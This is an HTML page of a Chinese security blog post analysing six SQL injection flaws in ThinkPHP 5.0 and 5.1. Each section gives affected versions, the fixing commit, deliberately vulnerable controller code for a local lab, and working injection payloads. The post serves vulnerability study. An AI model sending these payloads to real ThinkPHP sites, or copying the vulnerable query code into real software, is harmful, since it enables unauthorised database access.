@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head><meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+<meta name="description" content="TP5漏洞分析SQL注入篇"/><meta name="keywords" content="research,analyze" /><link rel="alternate" href="/atom.xml" title="Blog" type="application/atom+xml"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=2.11.0" />
+<link rel="canonical" href="https://hosch3n.github.io/2020/10/21/TP5漏洞分析SQL注入篇/"/>
+
+<link rel="stylesheet" type="text/css" href="/lib/fancybox/jquery.fancybox.css" />
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=2.11.0" />
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-180953397-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-180953397-1');
+</script><script id="baidu_push">
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+<script>
+  window.config = {"leancloud":{"app_id":null,"app_key":null},"toc":true,"fancybox":true,"pjax":"","latex":false};
+</script>
+
+    <title>TP5漏洞分析SQL注入篇 - Blog</title>
+  <meta name="generator" content="Hexo 5.4.0"></head>
+
+  <body><div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/." class="logo">Blog</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list"><a href="/">
+        <li class="mobile-menu-item">首页
+          </li>
+      </a><a href="/tags/">
+        <li class="mobile-menu-item">标签
+          </li>
+      </a><a href="/categories/">
+        <li class="mobile-menu-item">分类
+          </li>
+      </a><a href="/about/">
+        <li class="mobile-menu-item">关于
+          </li>
+      </a></ul>
+</nav>
+<div class="container" id="mobile-panel">
+      <header id="header" class="header"><div class="logo-wrapper">
+  <a href="/." class="logo">Blog</a>
+</div>
+
+<nav class="site-navbar"><ul id="menu" class="menu"><li class="menu-item">
+          <a class="menu-item-link" href="/">
+            首页
+            </a>
+        </li>
+      <li class="menu-item">
+          <a class="menu-item-link" href="/tags/">
+            标签
+            </a>
+        </li>
+      <li class="menu-item">
+          <a class="menu-item-link" href="/categories/">
+            分类
+            </a>
+        </li>
+      <li class="menu-item">
+          <a class="menu-item-link" href="/about/">
+            关于
+            </a>
+        </li>
+      </ul></nav>
+</header>
+
+      <main id="main" class="main">
+        <div class="content-wrapper">
+          <div id="content" class="content"><article class="post">
+    <header class="post-header">
+      <h1 class="post-title">TP5漏洞分析SQL注入篇
+        </h1>
+
+      <div class="post-meta">
+        <span class="post-time">
+          2020-10-21
+        </span><span class="post-category">
+            <a href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a>
+            </span>
+        </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+    <h2 class="post-toc-title">文章目录</h2>
+    <div class="post-toc-content">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD"><span class="toc-text">基础设施</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A51"><span class="toc-text">SQL注入1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">漏洞分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A52"><span class="toc-text">SQL注入2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1"><span class="toc-text">漏洞分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A53"><span class="toc-text">SQL注入3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-2"><span class="toc-text">漏洞分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A54"><span class="toc-text">SQL注入4</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-3"><span class="toc-text">漏洞分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A55"><span class="toc-text">SQL注入5</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-4"><span class="toc-text">漏洞分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A56"><span class="toc-text">SQL注入6</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-5"><span class="toc-text">漏洞分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-text">参考链接</span></a></li></ol>
+    </div>
+  </div><div class="post-content"><h2 id="基础设施"><a href="#基础设施" class="headerlink" title="基础设施"></a>基础设施</h2><p>大致扫一遍ThinkPHP官方的《完全开发手册》，知道有疑问时应该去哪个章节找就行。</p>
+<ol start="0">
+<li>通过composer拉取项目</li>
+</ol>
+<p><code>composer create-project --prefer-dist topthink/think=5.0.15 tpdemo</code></p>
+<ol>
+<li>调整<code>composer.json</code>中的依赖为需要测试的具体版本</li>
+</ol>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;require&quot;: &#123;</span><br><span class="line">    &quot;php&quot;: &quot;&gt;=5.4.0&quot;,</span><br><span class="line">    &quot;topthink/framework&quot;: &quot;5.0.15&quot;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li><p>执行<code>composer update</code>更新项目</p>
+</li>
+<li><p>创建mysql数据库</p>
+</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">create database tpdemo;</span><br><span class="line">use tpdemo;</span><br><span class="line">create table users(</span><br><span class="line">    id int primary key auto_increment,</span><br><span class="line">    username varchar(50) not null</span><br><span class="line">);</span><br><span class="line">insert into users(id,username) values(1,&#39;hoschen&#39;);</span><br><span class="line">create user tpdemo@localhost identified by &#39;passwd&#39;;</span><br><span class="line">grant all on tpdemo.* to tpdemo@localhost;</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure>
+
+<ol start="4">
+<li><p>配置<code>application/database.php</code>中对应参数</p>
+</li>
+<li><p>将<code>application/config.php</code>中的<code>app_debug</code>和<code>app_trace</code>改为<code>true</code>，用于回显错误</p>
+</li>
+<li><p>编写<code>application/index/controller/Index.php</code>模块的代码构造漏洞输入点</p>
+</li>
+</ol>
+<h2 id="SQL注入1"><a href="#SQL注入1" class="headerlink" title="SQL注入1"></a>SQL注入1</h2><p>Builder类（thinkphp/library/think/db/Builder.php）的parseData方法，将未过滤的用户输入拼接进insert/update语句，存在SQL注入漏洞。</p>
+<p>影响版本：</p>
+<ul>
+<li>5.0.13&lt;=ThinkPHP&lt;=5.0.15</li>
+<li>5.1.0&lt;=ThinkPHP&lt;=5.1.5</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;tpdemo&#x2F;public&#x2F;index.php?s&#x3D;&#x2F;index&#x2F;index&#x2F;index&amp;username[0]&#x3D;inc&amp;username[1]&#x3D;exp(~(select * from(select user())a))&amp;username[2]&#x3D;1</span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><a target="_blank" rel="noopener" href="https://github.com/top-think/framework/releases?after=v5.0.18">5.0.16</a>版本更新说明中表示包含一个安全更新，具体看到<a target="_blank" rel="noopener" href="https://github.com/top-think/framework/commit/091e7b734d4ce3e1288f47a7932a143fad73a4bd?branch=091e7b734d4ce3e1288f47a7932a143fad73a4bd&diff=split">改进inc/dec查询</a>这个commit</p>
+<p><img src="/img/tp5ldfxsqli_a.png"></p>
+<p>将源码版本更新为<code>5.0.15</code>，由<code>thinkphp/library/think/db/Builder.php</code>的113行可知触发这部分逻辑需要传入一个数组：</p>
+<p><img src="/img/tp5ldfxsqli_b.png"></p>
+<p>全局搜索对应的<code>parseData</code>方法，看到可以由718行的<code>insert</code>方法或是由823行的<code>update</code>方法触发。编写对应触发逻辑：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 通过request助手函数的get方法，获取$_GET[&#x27;username&#x27;]的数据</span></span><br><span class="line">        $username = request()-&gt;get(<span class="string">&#x27;username/a&#x27;</span>);</span><br><span class="line">        <span class="comment">// 通过db助手函数的insert方法，传入username数组（上面/a修饰符表示数组类型）</span></span><br><span class="line">        db(<span class="string">&#x27;users&#x27;</span>)-&gt;insert([<span class="string">&#x27;username&#x27;</span> =&gt; $username]);</span><br><span class="line">        <span class="comment">// 也可以通过update方法</span></span><br><span class="line">        <span class="comment">// db(&#x27;users&#x27;)-&gt;where(&#x27;id&#x27;,1)-&gt;update([&#x27;username&#x27; =&gt; $username]);</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Update success&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>跟一下变量的传递过程可知，<code>username</code>即对应我们需要触发的那段逻辑中switch语句的<code>$val</code>，于是传入<code>username[0]=dec&amp;username[1]=a&amp;username[2]=1</code>进行动态调试，中间经过<code>parseKey</code>等函数后最终生成的sql语句：</p>
+<p><img src="/img/tp5ldfxsqli_c.png"></p>
+<p>显然<code>str_replace</code>函数是一个功能性函数，而并非是安全过滤函数，最终使得用户提供的数据被直接拼接进SQL语句中。</p>
+<p>因为<code>username[0]</code>用于控制switch语句条件、<code>username[2]</code>会经过<code>floatval</code>函数强转，所以尝试通过<code>username[1]</code>传入报错注入Payload：</p>
+<p><code>username[0]=dec&amp;username[1]=(extractvalue(1,concat(0x7e,(select user()),0x7e)))&amp;username[2]=1</code></p>
+<p>得到报错：<code>1105 Only constant XPATH queries are supported</code>，XPATH系列用不了，换一种：</p>
+<p><code>username[0]=dec&amp;username[1]=exp(~(select * from(select user())a))&amp;username[2]=1</code></p>
+<p>最终拼接而成的SQL语句为：</p>
+<p><code>&quot;INSERT INTO `users` (`username`) VALUES (exp(~(select * from(select user())a))-1) &quot;</code></p>
+<p><img src="/img/tp5ldfxsqli_d.png"></p>
+<p><code>update</code>方法类似就不再赘述了，需要注意的是官方修复时仅处理了<code>inc</code>和<code>dec</code>条件，但是并没有改动同样在switch语句中的<code>exp</code>条件，原因是当<code>username[0]</code>为<code>exp</code>时，会被<code>thinkphp/library/think/Request.php</code>中1096行的<code>filterExp</code>方法替换为<code>exp[空格]</code>，最终因为不满足switch语句的任意条件被结束。</p>
+<h2 id="SQL注入2"><a href="#SQL注入2" class="headerlink" title="SQL注入2"></a>SQL注入2</h2><p>Builder类（thinkphp/library/think/db/Builder.php）的parseArrayData方法，将未过滤的用户输入拼接进insert/insertAll/update语句，存在SQL注入漏洞。</p>
+<p>影响版本：</p>
+<ul>
+<li>5.1.6&lt;=ThinkPHP&lt;=5.1.7、以及部分5.1.8</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;tpdemo&#x2F;public&#x2F;index.php?s&#x3D;&#x2F;index&#x2F;index&#x2F;index&amp;username[0]&#x3D;point&amp;username[1]&#x3D;a&amp;username[2]&#x3D;exp(~(select * from(select user())a))^&amp;username[3]&#x3D;a</span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><a target="_blank" rel="noopener" href="https://github.com/top-think/framework/releases?after=v5.1.13">5.1.9</a>版本更新说明中表示包含一个安全更新，具体看到<a target="_blank" rel="noopener" href="https://github.com/top-think/framework/commit/39bb0fe6d50ee77e0779f646b10bce08c442a5e3">改进mysql驱动</a>这个commit</p>
+<p><img src="/img/tp5ldfxsqli_e.png"></p>
+<p>直接删掉了<code>default</code>分支和<code>parseArrayData</code>方法。将源码版本更新为<code>5.1.17</code>，可以看到基本与SQL注入1逻辑相同。</p>
+<p>全局搜索对应的<code>parseData</code>方法，看到可由1030行的<code>insert</code>方法、1063行的<code>insertAll</code>方法或是由1134行的<code>update</code>方法触发。需要编写的对应触发逻辑用SQL注入1的就行，而且多了一种触发方式：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// insertAll方法接收一个二维数组</span></span><br><span class="line">db(<span class="string">&#x27;users&#x27;</span>)-&gt;insertAll([[<span class="string">&#x27;username&#x27;</span> =&gt; $username]]);</span><br></pre></td></tr></table></figure>
+
+<p>跟一下变量的传递过程可知，<code>username</code>依然对应我们需要触发的那段逻辑中switch语句的<code>$val</code>，这次进入default分支跟进<code>parseArrayData</code>方法，看到需要让<code>username[0]</code>为<code>point</code>不然就会嗝屁：</p>
+<p><img src="/img/tp5ldfxsqli_f.png"></p>
+<p>因此传入<code>username[0]=point&amp;username[1]=a&amp;username[2]=b&amp;username[3]=c</code>进行动态调试，中间经过<code>parseData</code>等函数后最终生成的sql语句：</p>
+<p><img src="/img/tp5ldfxsqli_g.png"></p>
+<p>方便起见直接在<code>b</code>的位置传入报错注入Payload并闭合语句：</p>
+<p><code>username[0]=point&amp;username[1]=a&amp;username[2]=exp(~(select * from(select user())a))^&amp;username[3]=a</code></p>
+<p>最终拼接而成的SQL语句为：</p>
+<p><code>&quot;INSERT INTO `users` (`username`) VALUES (exp(~(select * from(select user())a))^(&#39;a(a)&#39;)) &quot;</code></p>
+<p><img src="/img/tp5ldfxsqli_h.png"></p>
+<ul>
+<li><code>update</code>和<code>insertAll</code>方法同理</li>
+</ul>
+<h2 id="SQL注入3"><a href="#SQL注入3" class="headerlink" title="SQL注入3"></a>SQL注入3</h2><p>Builder类（thinkphp/library/think/db/Builder.php）的parseWhereItem方法，将未过滤完全的用户输入拼接进where语句，存在SQL注入漏洞。</p>
+<p>影响版本：</p>
+<ul>
+<li>5.0.10</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;tpdemo&#x2F;public&#x2F;index.php?s&#x3D;&#x2F;index&#x2F;index&#x2F;index&amp;username[0]&#x3D;not%20like&amp;username[1][0]&#x3D;%%&amp;username[1][1]&#x3D;anything&amp;username[2]&#x3D;)%20union%20select%20database(),user()%23</span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><a target="_blank" rel="noopener" href="https://github.com/top-think/framework/releases?after=v5.0.14">5.0.11</a>版本更新说明中表示包含一个安全更新，具体看到<a target="_blank" rel="noopener" href="https://github.com/top-think/framework/commit/495020b7b0c16de40f20b08f2ab3be0a2b816b96">改进Request类filterExp方法</a>这个commit，增加了对<code>not like</code>的过滤。</p>
+<p><img src="/img/tp5ldfxsqli_j.png"></p>
+<p>凡是使用框架提供的请求变量获取方法(Request类<code>param</code>方法及<code>input</code>助手函数)，都会经过这个<code>filterExp</code>方法的过滤。针对<code>not like</code>操作符，编写对应的<code>where</code>方法触发逻辑：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$username = request()-&gt;get(<span class="string">&#x27;username/a&#x27;</span>);</span><br><span class="line">$result = db(<span class="string">&#x27;users&#x27;</span>)-&gt;where([<span class="string">&#x27;username&#x27;</span> =&gt; $username])-&gt;select();</span><br><span class="line">var_dump($result);</span><br></pre></td></tr></table></figure>
+
+<p>相比前两个代码改动直接在漏洞点的补丁分析，这里的代码改动是在全局过滤函数的规则上，该如何根据这个变动敏感地嗅探到能被利用漏洞点呢？这是需要之后进一步思考的地方。</p>
+<p>带着这个问题动态调试可以发现，输入流过程中有很多针对数组的解析函数，也会理解Payload要这样构造的原因：当然就是要满足一些if判断逻辑，让输入流进入到预期漏洞代码块了hhh（废话）</p>
+<p><img src="/img/tp5ldfxsqli_k.png"></p>
+<ul>
+<li>因为PHP7的原因，需要调整一下implode函数的参数顺序</li>
+</ul>
+<p><img src="/img/tp5ldfxsqli_l.png"></p>
+<p>一波拼接操作后生成的<code>whereStr</code>为<code>&quot;(`username` NOT LIKE &#39;%%&#39; ) UNION SELECT DATABASE(),USER()# `username` NOT LIKE &#39;anything&#39;)&quot;</code></p>
+<p>这样就能让<code>username</code>字段匹配不到NULL之外的值避免占据回显点位，同时注释掉后面被implode函数合并进来的副作用语句，避免语法错误。</p>
+<p>最终带入数据库执行的SQL语句为：</p>
+<p><img src="/img/tp5ldfxsqli_m.png"></p>
+<p>官方在个版本里新引入了<code>NOT LIKE</code>这个操作符，但是没加上对应的过滤规则导致了漏洞的产生。</p>
+<h2 id="SQL注入4"><a href="#SQL注入4" class="headerlink" title="SQL注入4"></a>SQL注入4</h2><p>特定模式（<code>exp</code>）下的SQL语句执行：</p>
+<p>影响版本：</p>
+<ul>
+<li>全版本</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;tpdemo&#x2F;public&#x2F;index.php?s&#x3D;&#x2F;index&#x2F;index&#x2F;index&amp;username&#x3D;) union select database(),user()%23</span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>这里官方认为属于正常功能不作修复，因此不存在补丁更新对比。编写对应触发逻辑来调试分析一下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$username = request()-&gt;get(<span class="string">&#x27;username/a&#x27;</span>);</span><br><span class="line">$result = db(<span class="string">&#x27;users&#x27;</span>)-&gt;where([<span class="string">&#x27;username&#x27;</span> =&gt; $username])-&gt;select();</span><br><span class="line">var_dump($result);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/tp5ldfxsqli_i.png"></p>
+<p>流程与上一个洞类似就不赘述了，查看《ThinkPHP5.0完全开发手册》193页可以看到说明了<code>exp</code>模式就是用作SQL语法模式的，所以我个人觉得官方不认为这是一个漏洞也在情理之中。</p>
+<h2 id="SQL注入5"><a href="#SQL注入5" class="headerlink" title="SQL注入5"></a>SQL注入5</h2><p>Builder类（thinkphp/library/think/db/Builder.php）的parseOrder方法，将未过滤的用户输入拼接进select/update/delete语句，存在SQL注入漏洞。</p>
+<p>影响版本：</p>
+<ul>
+<li>5.1.16&lt;=ThinkPHP&lt;=5.1.22</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;tpdemo&#x2F;public&#x2F;index.php?s&#x3D;&#x2F;index&#x2F;index&#x2F;index&amp;orderby[id&#96;|updatexml(1,concat(0x7e,(select user()),0x7e),1)%23]&#x3D;1</span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞分析-4"><a href="#漏洞分析-4" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><a target="_blank" rel="noopener" href="https://github.com/top-think/framework/releases?after=v5.1.30">5.1.23</a>版本更新说明中表示改进了order方法的数组方式解析增强安全性，具体看到<a target="_blank" rel="noopener" href="https://github.com/top-think/framework/commit/673e505421b25bdee2f02b668e5fd1ac79a3d190">改进order方法解析</a>这个commit</p>
+<p><img src="/img/tp5ldfxsqli_n.png"></p>
+<p>增加了对<code>)</code>和<code>#</code>符号的判断。将源码版本更新为<code>5.1.22</code>，全局搜索<code>parseOrder</code>方法，看到可以由1037行的select方法、1170行的update方法或是由1206行的delete方法触发。编写对应触发逻辑：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$orderby = request()-&gt;get(<span class="string">&#x27;orderby&#x27;</span>);</span><br><span class="line"><span class="comment">// $result = db(&#x27;users&#x27;)-&gt;where([&#x27;username&#x27; =&gt; &#x27;hoschen&#x27;])-&gt;order($orderby)-&gt;find();</span></span><br><span class="line"><span class="comment">// 也可以通过update方法，</span></span><br><span class="line"><span class="comment">// db(&#x27;users&#x27;)-&gt;where(&#x27;id&#x27;, 1)-&gt;order($orderby)-&gt;update([&#x27;username&#x27; =&gt; &#x27;hoschen&#x27;]);</span></span><br><span class="line"><span class="comment">// 还可以通过delete方法，支持XPATH系列函数</span></span><br><span class="line">db(<span class="string">&#x27;users&#x27;</span>)-&gt;where(<span class="string">&#x27;id&#x27;</span>, <span class="number">1</span>)-&gt;order($orderby)-&gt;delete();</span><br><span class="line">var_dump($result);</span><br></pre></td></tr></table></figure>
+
+<p>这里传入Payload动态调试后可以发现拼接而成的SQL语句为：<code>&quot;DELETE FROM `users` WHERE  `id` = :where_AND_id ORDER BY `id`|updatexml(1,concat(0x7e,(select user()),0x7e),1)#` &quot; </code></p>
+<p>为啥这里用的delete方法？因为在我的环境下前两种方法都会得到报错：<code>1105 Only constant XPATH queries are supported</code>，而通过exp等函数整数溢出报错也无效，希望知道原因的师傅指点我一下。</p>
+<h2 id="SQL注入6"><a href="#SQL注入6" class="headerlink" title="SQL注入6"></a>SQL注入6</h2><p>聚合查询方法将未过滤的用户输入拼接进SQL语句中，存在SQL注入漏洞。</p>
+<p>影响版本：</p>
+<ul>
+<li>5.0.0&lt;=ThinkPHP&lt;=5.0.21</li>
+<li>5.1.3&lt;=ThinkPHP&lt;=5.1.25</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 5.1.11～5.1.25需要改为 id&#96;)</span><br><span class="line">id)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23</span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞分析-5"><a href="#漏洞分析-5" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><a target="_blank" rel="noopener" href="https://github.com/top-think/framework/releases?after=v5.1.30">5.1.26</a>版本更新说明中表示包含一个安全更新，具体看到<a target="_blank" rel="noopener" href="https://github.com/top-think/framework/commit/26a1b2fe9571c151ccd5e7ad05b3bb33385ecde3">改进mysql驱动和sqlsrv驱动</a>这个commit</p>
+<p><img src="/img/tp5ldfxsqli_o.png"></p>
+<p>只允许字母、数字、下划线、点号、星号，不然抛出异常。</p>
+<ul>
+<li>因为对框架不熟悉，想根据这类补丁对比找出具体的漏洞发生点实在是困难，得多学习历史漏洞积累经验才行。这里也由于暂未复现成功，只能先搁置一下了</li>
+</ul>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://github.com/Mochazz/ThinkPHP-Vuln/tree/master/ThinkPHP5">ThinkPHP-Vuln</a></p>
+
+      </div>
+      
+      <footer class="post-footer">
+        <div class="post-tags">
+            <a href="/tags/Thinkphp/">Thinkphp</a>
+            <a href="/tags/SQLi/">SQLi</a>
+            </div>
+        
+        <nav class="post-nav"><a class="prev" href="/2020/11/05/TP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E7%AF%87/">
+        <i class="iconfont icon-left"></i>
+        <span class="prev-text nav-default">TP5漏洞分析代码执行篇</span>
+        <span class="prev-text nav-mobile">上一篇</span>
+      </a>
+    <a class="next" href="/2020/09/25/SSRF%E6%89%93Redis%E8%A7%84%E9%81%BF%E5%9D%8F%E5%AD%97%E7%AC%A6/">
+        <span class="next-text nav-default">SSRF打Redis规避坏字符</span>
+        <span class="prev-text nav-mobile">下一篇</span>
+        <i class="iconfont icon-right"></i>
+      </a>
+    </nav></footer>
+    </article></div><div class="comments" id="comments"></div></div>
+      </main>
+
+      <footer id="footer" class="footer"><div class="social-links"><a href="mailto:hosch3n@protonmail.com" class="iconfont icon-email" title="email"></a>
+        <a target="_blank" rel="noopener" href="https://github.com/hosch3n" class="iconfont icon-github" title="github"></a>
+        <a href="/atom.xml" class="iconfont icon-rss" title="rss"></a>
+    </div><div class="copyright">
+  <span class="power-by">
+    由 <a class="hexo-link" target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> 强力驱动
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    主题 - 
+    <a class="theme-link" target="_blank" rel="noopener" href="https://github.com/ahonn/hexo-theme-even">Even</a>
+  </span>
+
+  <span class="copyright-year">&copy;2021 - 2022<span class="heart">
+      <i class="iconfont icon-heart"></i>
+    </span>
+    <span class="author">hosch3n</span>
+  </span>
+</div>
+</footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div><script type="text/javascript" src="/lib/jquery/jquery.min.js"></script>
+  <script type="text/javascript" src="/lib/slideout/slideout.js"></script>
+  <script type="text/javascript" src="/lib/fancybox/jquery.fancybox.pack.js"></script>
+  <script type="text/javascript" src="/js/src/even.js?v=2.11.0"></script>
+</body>
+</html>
